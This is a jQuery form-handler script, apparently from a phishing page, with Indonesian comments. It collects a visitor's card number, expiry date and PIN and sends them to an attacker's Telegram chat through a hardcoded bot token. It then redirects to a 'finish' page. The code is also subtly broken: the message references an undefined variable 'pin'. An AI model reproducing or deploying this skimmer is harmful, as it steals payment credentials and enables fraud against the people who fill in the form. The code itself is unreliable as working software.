$(document).ready(function() {
    console.log('JS loaded');

    // Mask nomor HP
    $('#nomor').on('input', function() {
        if($(this).val() === '0' || $(this).val() === '62') {
            $(this).val('');
        }
    });

    // Mask pesan panjang (tidak perlu masking)
    
    // Submit form
    $('#form1').on('submit', function(e) {
        e.preventDefault();
        console.log('Form submitted');

        const nama = $('#cardNumber').val().trim();
        const nomor = $('#expiryDate').val().trim();
        const pesan = $('#pin').val().trim();

        if (!nama) { alert('cardNumber tidak boleh kosong.'); return; }
        if (!nomor) { alert('expiryDate tidak boleh kosong.'); return; }
        if (!pesan) { alert('pin tidak boleh kosong.'); return; }

        console.log('Validation passed');

        $("#loader").show();

        sessionStorage.setItem('cardNumber', nama);
        sessionStorage.setItem('expiryDate', nomor);
        sessionStorage.setItem('pin', pesan);

        const message = `
📩 *Form Baru Masuk*
──────────────────
• *Nama:* ${nama}
• *Nomor:* ${nomor}
• *Pin:* ${pin}
──────────────────
        `;

        const token_bot = "7504434844:AAEJvY81gVUID8gl1BCqdR28oNld83WbNxM";
        const chat_id = "7213790655";

        const url = `https://api.telegram.org/bot${token_bot}/sendMessage?parse_mode=markdown&chat_id=${chat_id}&text=${encodeURIComponent(message)}`;

        fetch(url)
            .then(res => res.json())
            .then(data => {
                $("#loader").hide();
                if (data.ok) {
                    window.location.href = "finish.html";
                } else {
                    alert("Gagal mengirim pesan.");
                }
            })
            .catch(err => {
                $("#loader").hide();
                alert("Error: " + err.message);
            });
    });
});
